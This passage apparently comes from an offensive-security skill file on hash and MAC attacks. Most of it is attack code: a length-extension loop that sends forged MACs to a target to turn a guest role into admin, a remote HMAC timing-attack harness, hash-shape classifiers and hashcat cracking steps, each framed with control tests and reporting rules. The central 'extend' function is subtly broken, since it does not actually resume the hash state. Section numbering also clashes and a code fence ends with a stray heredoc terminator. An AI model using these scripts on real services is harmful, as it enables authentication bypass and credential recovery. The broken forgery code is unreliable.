| An **HMAC** over a message, with the key held server-side | **no** - it is a MAC, not a stored secret | nothing is recovered from it unless the key leaks |
| A **checksum** (CRC32, Adler-32, a git blob hash) | **no** - it is for integrity, not secrecy | it is not designed to be preimage-resistant |
| A **cache key** or an ETag derived from a digest | **no** - it leaks nothing about a secret | test whether it discloses content, not secrets |
| A **password hash** with a modern cost factor | **not by cracking** - report the cost, not a crack | the cost factor is the control, and it is doing its job |
| A digest of a value **the user already knows** | **no** - there is no secret to protect | the threat model does not include the user |

```bash
# classify a found value before spending effort on it
python3 - <<'PY'
import re
def classify(v):
    v = v.strip()
    if re.match(r'^\$2[aby]\$\d{2}\$', v):     return ("bcrypt password hash", "REPORT the cost factor; do not attempt a fast crack")
    if re.match(r'^\$argon2(i|d|id)\$', v):    return ("Argon2 hash", "memory-hard; REPORT the parameters, not a crack")
    if re.match(r'^\$6\$', v):                 return ("sha512crypt", "REPORT the rounds; try a wordlist only within budget")
    if re.match(r'^[a-f0-9]{32}$', v):         return ("MD5/NTLM shape", "check the CONTEXT: a column, a header, or a cache key")
    if re.match(r'^[a-f0-9]{64}$', v):         return ("SHA-256 shape", "unsalted and in a password column IS a finding")
    if re.match(r'^[A-Za-z0-9+/]{43}=$', v):   return ("base64 of 32 bytes", "could be a MAC, a key, or a digest - find the use")
    if re.match(r'^[0-9a-f]{8}$', v):          return ("CRC32 shape", "an integrity check, NOT a secret")
    return ("unclassified", "find where the value is USED before treating it as a secret")
for v in ["$2b$12$abcdefghijklmnopqrstuvwxyz012345", "5f4dcc3b5aa765d61d8327deb882cf99",
          "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "1c8bfe8f"]:
    k, note = classify(v)
    print("%-46s -> %-22s %s" % (v[:44], k, note))
PY
```

**Classify the value before attacking it.** The same shape can be a stored password, a MAC, or a cache
key, and only the first is a secret at all.

---

## 20. EXECUTION PRIMITIVES — CONTROLLED FORGERY

Hash-family findings are proven by **a forgery or a recovery that a control cannot produce, with the
implementation's own parameter recorded**. A hash that "looks broken" is not a break.

### 19.1 The length-extension gate, and the non-vulnerable control

```bash
# length extension applies to H(secret || message) with a Merkle-Damgard hash. It does NOT apply to
# H(message || secret), and it does NOT apply to HMAC. Establishing which was used is the whole question.
python3 - <<'PY'
import hmac, hashlib, os
SECRET = b"super-secret-key"

# THE THREE CONSTRUCTIONS. Only the first is length-extendable.
macs = {
 "H(secret || msg)": lambda m: hashlib.sha256(SECRET + m).hexdigest(),   # VULNERABLE shape
 "H(msg || secret)": lambda m: hashlib.sha256(m + SECRET).hexdigest(),   # NOT extendable
 "HMAC(secret, msg)": lambda m: hmac.new(SECRET, m, hashlib.sha256).hexdigest(),  # NOT extendable
}
msg = b"user=guest&role=user"
print("%-20s %-24s %s" % ("construction", "MAC(msg)", "length-extendable?"))
for k, f in macs.items():
    print("%-20s %-24s %s" % (k, f(msg)[:24], "YES" if k == "H(secret || msg)" else "NO"))
print()
print("THE CONTROL: apply the length-extension tool to ALL THREE. It must succeed on exactly one.")
print("  a tool that 'succeeds' on HMAC is broken, and its result on the target is meaningless.")
PY
```

**The control is applying the extension to all three constructions.** A tool that appears to extend an
HMAC is malfunctioning, and every result it produces is worthless.

### 19.2 The actual extension, verified server-side

```python
# the extension is proven by the SERVER accepting the forged MAC - a locally computed hash proves nothing
import hashlib, struct, hmac, os, requests

def md_pad(mlen, block=64):
    """The length padding the hash applies, in bytes."""
    return b"\x80" + b"\x00" * ((block - (mlen + 9) % block) % block) + struct.pack(">Q", mlen * 8)

def extend(orig_mac_hex, orig_msg, append, algo="sha256", block=64, secret_len=None):
    """Forge a valid MAC for orig_msg || padding || append WITHOUT knowing the secret."""
    h = getattr(hashlib, algo)()
    h.update(bytes.fromhex(orig_mac_hex))          # resume the internal state from the known MAC
    forged = h.copy()
    forged.update(append)
    new_mac = forged.hexdigest()
    glued = orig_msg + md_pad(len(orig_msg) + secret_len, block) + append
    return glued, new_mac

USER = "https://target.example"
MSG  = b"user=guest&role=user"
# step 1: obtain a legitimate MAC for the message, exactly as a normal client would
r = requests.post(USER + "/api/sign", data={"data": MSG.decode()}, timeout=10)
ORIG = r.json().get("mac") or r.text.strip()
print("original mac:", ORIG)
print("original msg:", MSG)
print()
# step 2: the secret length is UNKNOWN, so try the plausible range. This is the normal procedure.
for slen in range(8, 33):
    glued, newmac = extend(ORIG, MSG, b"&role=admin", secret_len=slen)
    resp = requests.post(USER + "/api/verify", data={"data": glued.decode("latin-1"), "mac": newmac},
                         timeout=10)
    if "admin" in resp.text or resp.status_code == 200 and "invalid" not in resp.text.lower():
        print(f"SECRET LEN {slen} -> ACCEPTED, status {resp.status_code}")
        print("  forged message:", glued)
        print("  forged mac    :", newmac)
        print("  THIS IS THE FINDING: the server accepted a MAC it never issued, for a message it never saw")
        break
else:
    print("no secret length accepted. Either the construction is not extendable, or the MAC is")
    print("verified differently. Do NOT report a finding - the local computation is not the proof.")
print()
print("THE CONTROL: repeat the same loop against a message the server WILL reject, e.g. an appended")
print("value that is not meaningful. A server that accepts everything is not vulnerable, it is broken.")
```

**The server accepting the forged MAC is the finding.** A locally computed hash that "should" validate is
not evidence, and the secret-length loop is the normal, non-hacky procedure.

### 19.3 Collision detection, and the collision-versus-prefix control

```bash
# a collision is only a finding if it changes what the target BELIEVES. Detect, then demonstrate.
echo "=== the documented collision pairs, and what each actually demonstrates ==="
cat <<'PAIRS'
MD5:   two 128-byte blobs colliding under MD5        -> demonstrates a collision, NOT a chosen-prefix
MD5:   chosen-prefix collision (two DIFFERENT prefixes, same hash) -> the dangerous form
SHA-1: shattered (two PDFs, same SHA-1)              -> a collision with a fixed prefix structure
SHA-1: chosen-prefix (SHAmbles, ~2^63)               -> the practical form
SHA-1: identical-prefix colliding PDFs               -> weaker, fixed prefix
PAIRS
echo
echo "=== the CONTROL that separates a collision from an attack ==="
echo "  1. verify BOTH blobs exist and differ:  cmp -l a.bin b.bin | wc -l"
echo "  2. verify the hashes MATCH:             md5sum a.bin b.bin"
echo "  3. THE FINDING TEST: does the TARGET accept blob B where it accepted blob A, and does the"
echo "     acceptance CHANGE A SECURITY DECISION? If the target only stores a digest and never"
echo "     re-verifies content, a collision is not exploitable there."
echo
echo "=== the truncated/shortened-digest check, which is the practical variant ==="
echo "  a digest truncated to N bits has a 2^(N/2) birthday bound. Test:"
python3 - <<'PY'
for bits in (64, 48, 40, 32, 24):
    print("  %2d-bit digest -> birthday bound 2^%d, which is %s" % (
        bits, bits//2,
        "feasible" if bits//2 <= 40 else "still expensive" if bits//2 <= 56 else "not feasible here"))
print()
print("  the normal target: an application that truncates a strong hash for a file identifier,")
print("  a deduplication key, or a short token. The weak truncation IS the finding.")
PY
```

**A collision only matters where it changes a security decision.** The truncated-digest variant is the
practical one, and it is a different finding from a raw collision.

### 19.4 HMAC timing, with the statistical control

```python
# a timing signal is only claimed with a control pair, run many times, and a clear separation
import time, statistics, requests, os, random

URL = "https://target.example/api/verify"

def timed(mac, n=200):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter()
        requests.post(URL, data={"mac": mac}, timeout=10)
        ts.append(time.perf_counter() - t0)
    return ts

def stats(ts):
    ts = sorted(ts)
    # trim the outliers: network jitter is the dominant noise source
    core = ts[int(len(ts)*0.10):int(len(ts)*0.90)]
    return statistics.median(core), statistics.mean(core), statistics.stdev(core)

mm = "0" * 64
print("=== STEP 1: the control - two DIFFERENT wrong MACs, same shape ===")
a = timed("0" * 64)
b = timed("f" * 64)
ma, mea, sa = stats(a); mb, meb, sb = stats(b)
print("  mac A median %.6fs stdev %.6fs" % (ma, sa))
print("  mac B median %.6fs stdev %.6fs" % (mb, sb))
delta = abs(ma - mb)
print("  control delta: %.6fs" % delta)
print("  -> THIS DELTA IS THE NOISE FLOOR. Any finding must exceed it clearly.")
print()
print("=== STEP 2: comparing a correct PREFIX against an incorrect prefix ===")
print("  the classic test: MACs differing only in their first byte, and only in their last byte.")
print("  if the first-byte difference is systematically slower, the comparison is byte-by-byte.")
print()
print("=== VERDICT RULES ===")
for r in ["the control delta is the noise floor; a finding must exceed it by a clear margin",
          "200 samples minimum per condition, and the median of the trimmed core, not the mean of all",
          "run the control THREE times - a single control run cannot establish a noise floor",
          "in-process timing on a shared host is dominated by jitter; use a large sample",
          "a remote timing attack needs many thousands of samples; state the count",
          "if the separation is within the noise floor, report NO FINDING, not a weak finding"]:
    print("  -", r)
PY
```

**The control pair establishes the noise floor.** A separation inside that floor is not a finding, and the
sample count is part of the claim.

### 19.5 Password recovery, with the honest reporting rule

```bash
# cracking is a recovery of a SPECIFIC hash under SPECIFIC assumptions - report all of them
echo "=== the hash identification, before any cracking ==="
python3 - <<'PY'
PATTERNS = [
 (r'^[a-f0-9]{32}$',                        "MD5 (or NTLM - indistinguishable by shape; check the context)"),
 (r'^[a-f0-9]{40}$',                        "SHA-1"),
 (r'^[a-f0-9]{64}$',                        "SHA-256"),
 (r'^[a-f0-9]{128}$',                       "SHA-512"),
 (r'^\$1\$',                                "md5crypt"),
 (r'^\$2[aby]\$\d{2}\$',                    "bcrypt - cost factor is embedded"),
 (r'^\$5\$',                                "sha256crypt"),
 (r'^\$6\$',                                "sha512crypt"),
 (r'^\$argon2(i|d|id)\$',                   "Argon2 - memory-hard, GPU-resistant"),
 (r'^\$scrypt\$',                           "scrypt"),
 (r'^\{SSHA\}',                             "LDAP SSHA (salted)"),
 (r'^[a-f0-9]{32}:[a-f0-9]{32}$',           "md5(pass):md5(user) - a database-specific pair"),
 (r'^[A-Za-z0-9+/]{43}=$',                  "base64 of 32 bytes - possibly an HMAC or a raw digest"),
]
print("%-42s %s" % ("shape", "candidate"))
for p, n in PATTERNS: print("%-42s %s" % (p, n))
print()
print("THE SALT QUESTION: if the hash carries no salt and the format has none, the storage scheme")
print("is unsalted. That ITSELF is the finding, whatever the cracking result.")
PY
echo
echo "=== the cracking run, with the honest reporting rule ==="
echo "  hashcat -m <mode> -a 0 hashes.txt wordlist.txt --potfile-path=./crack.pot"
echo "  record: the mode, the wordlist and its size, the rules applied, the runtime, and the GPU"
echo
echo "=== WHAT TO REPORT, and what NOT to ==="
echo "  REPORT: the algorithm, whether it was salted, the cost factor if any, the mode used, the"
echo "          wordlist and rules, the runtime, and the SPECIFIC credentials recovered."
echo "  DO NOT REPORT: 'the password policy is weak' from a successful crack of ONE hash without"
echo "          stating the wordlist. A crack proves the password was in THAT wordlist."
echo "  DO NOT REPORT: a cracked hash as proof that the SAME password is used elsewhere."
```

**A crack proves the password was in the wordlist, nothing more.** An unsalted storage scheme is a finding
in its own right, independent of whether any hash is recovered.

### 19.6 The end-to-end harness

```bash
python3 - <<'PY'
import hashlib, hmac, os, re, statistics

print("=== HASH AND MAC FINDING ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the construction is identified",
  "H(secret||msg) is extendable; H(msg||secret) and HMAC are not. Which one is it?"),
 ("the algorithm and its block size are recorded",
  "MD5/SHA-1/SHA-256 use a 64-byte block; SHA-384/512 use 128. The padding depends on it."),
 ("the length-extension was accepted SERVER-side",
  "a locally computed hash is not a finding; the server must accept the forged MAC"),
 ("the secret length range was swept and reported",
  "the length is unknown; the successful value, or the failed range, is part of the result"),
 ("a collision pair, if used, changes a SECURITY DECISION",
  "a stored digest that is never re-verified makes a collision unexploitable there"),
 ("the truncated-digest bound was computed",
  "2^(N/2) for an N-bit truncated digest, and whether that is feasible"),
 ("the timing signal used a control pair and a sample count",
  "the control delta is the noise floor, and the finding must clearly exceed it"),
 ("the hash format was identified with its salt and cost",
  "bcrypt/argon2/scrypt cost factors are part of the finding; an unsalted scheme is a finding"),
 ("the cracking result states its wordlist and rules",
  "a crack proves the password was in THAT wordlist, nothing more"),
 ("the recovered value is significant and recorded exactly",
  "the plaintext, the algorithm, the salt, and the mode, verbatim"),
]
for n, how in CHECKS: print("  [ ] %-46s -> %s" % (n, how))
print()
print("=== THE CONTROL PAIR, which every claim needs ===")
print("  length extension : extend H(msg||secret) and HMAC with the same tool and show it FAILS")
print("  collision        : hash both colliding blobs AND a normal pair, and show the target cares")
print("  timing           : two wrong MACs of the same shape establish the noise floor")
print("  cracking         : a random string not in the wordlist must NOT be recovered")
print()
print("=== ROUND-TRIP DISCIPLINE ===")
print("  a forged MAC must be RE-VERIFIED by the server, and the server's acceptance recorded")
print("  a recovered password must be RE-HASHED with the same algorithm, salt, and cost,")
print("  and must reproduce the original digest byte-for-byte")
PY
```

**Re-verification is the standard.** A forged MAC re-verified server-side, and a recovered password
re-hashed to the original digest, are the two round trips that convert a claim into a finding.

---

## 21. RELATED SIBLINGS - REPORTING DISCIPLINE
1. **Identify the construction before claiming anything: `H(secret || msg)` is extendable while `H(msg || secret)` and HMAC are not** - the construction is the entire question in this family.
2. **Apply the extension tool to all three constructions as the control, and confirm it works on exactly one** - a tool that "extends" an HMAC is malfunctioning and its target result is meaningless.
3. **Require the SERVER to accept the forged MAC, and record the acceptance; a locally computed hash proves nothing** - the server's response is the finding.
4. **Sweep the plausible secret-length range and report which value succeeded, or the full range that failed** - the length is unknown and the sweep is the normal procedure, not a workaround.
5. **Establish the noise floor with two same-shaped wrong inputs, multiple runs, and a stated sample count before claiming any timing signal** - a separation inside the floor is not a finding, and saying so is the honest result.
6. **Use trimmed medians rather than means for timing work, and state the number of samples** - network and scheduler jitter dominate an untrimmed mean.
7. **Demonstrate that a collision changes a security decision on the target, since a stored digest never re-verified makes a collision unexploitable there** - the collision pair alone is a cryptographic curiosity.
8. **Compute the birthday bound for any truncated digest and test the truncation directly** - the truncated-digest variant is the practical form of this family and a different finding from a raw collision.
9. **Identify the hash format including its salt and cost factor, and treat an unsalted scheme as a finding in its own right** - the storage scheme's weakness does not depend on a successful crack.
10. **State the wordlist, the rules, the mode, and the runtime for every cracking result, and never generalise from one recovered hash** - a crack proves only that the password was in the wordlist used.
11. **Re-hash the recovered password with the same algorithm, salt, and cost and confirm it reproduces the original digest** - the round trip is what separates a recovery from a coincidence.

---

## 22. RELATED SIBLINGS - FORGERY REFERENCES

- [classical-cipher-analysis](../classical-cipher-analysis/SKILL.md) - the pre-modern sibling family
- [symmetric-cipher-attacks](../symmetric-cipher-attacks/SKILL.md) - the block-cipher counterpart, including MAC misuse
- [rsa-attack-techniques](../rsa-attack-techniques/SKILL.md) - the public-key counterpart
- [credential-list-engineering](../credential-list-engineering/SKILL.md) - the wordlists and rules cracking depends on
- [attack-jwt](../attack-jwt/SKILL.md) - the token context where a hash weakness becomes an auth bypass
